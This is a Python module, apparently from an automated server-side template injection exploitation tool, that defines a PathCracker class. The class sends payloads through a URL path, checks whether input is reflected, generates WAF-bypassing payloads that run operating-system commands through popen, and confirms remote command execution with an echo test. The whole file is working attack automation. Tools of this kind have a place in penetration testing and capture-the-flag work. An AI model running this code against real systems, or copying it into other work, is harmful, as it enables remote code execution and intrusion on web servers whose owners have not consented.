"""攻击指定的路径

"""

import logging
import random
from collections import namedtuple
from urllib.parse import quote
from string import ascii_lowercase

from .requester import Requester
from .colorize import colored
from .const import (
    OS_POPEN_READ,
    DETECT_MODE_ACCURATE,
)
from .waf_func_gen_path import WafFuncGenPath
from .full_payload_gen import FullPayloadGen

logger = logging.getLogger("path_cracker")
Result = namedtuple("Result", "full_payload_gen input_field")


class PathCracker:
    test_cmd = "echo f3n  j1ng;"
    test_result = "f3n j1ng"

    def __init__(
        self,
        url: str,
        requester: Requester,
        detect_mode: str = DETECT_MODE_ACCURATE,
    ):
        self.url = url
        self.req = requester
        self.detect_mode = detect_mode
        self.waf_func_gen = WafFuncGenPath(url, requester, detect_mode)

    def submit(self, payload: str):
        """向一个路径发送payload

        Args:
            payload (str): payload

        Returns:
            Response: HTTP返回值
        """
        if len(payload) > 2048:
            logger.warning(
                "inputs are extremely long (len=%d) "
                + "that the request might fail",
                len(payload),
            )
        resp = self.req.request(method="GET", url=self.url + quote(payload))
        return resp

    def test_payload(self, payload: str):
        logger.info(
            "Testing generated payload.",
        )
        resp = self.submit(payload)
        assert resp is not None
        return self.test_result in resp.text

    def is_vulunable(self):
        content = "".join(random.choices(ascii_lowercase, k=6))
        resp = self.submit(content)
        assert resp is not None
        return content in resp.text

    def crack(self):
        logger.info("Testing...")
        waf_func = self.waf_func_gen.generate()
        full_payload_gen = FullPayloadGen(
            waf_func, callback=None, detect_mode=self.detect_mode
        )
        payload, will_print = full_payload_gen.generate(
            OS_POPEN_READ, self.test_cmd
        )
        if payload is None:
            return None
        # payload测试成功时为True, 失败时为False, 无法测试为None
        if will_print:
            if self.test_payload(payload):
                logger.info(
                    "%s Now we can generate payloads.",
                    colored("green", "Success!", bold=True),
                )
            else:
                logger.info(
                    "%s! Generated payloads might be useless.",
                    colored("yellow", "Test Payload Failed", bold=True),
                )
        else:
            logger.info(
                "We WON'T SEE the execution result! "
                + "You can try generating payloads anyway.",
            )
        return full_payload_gen
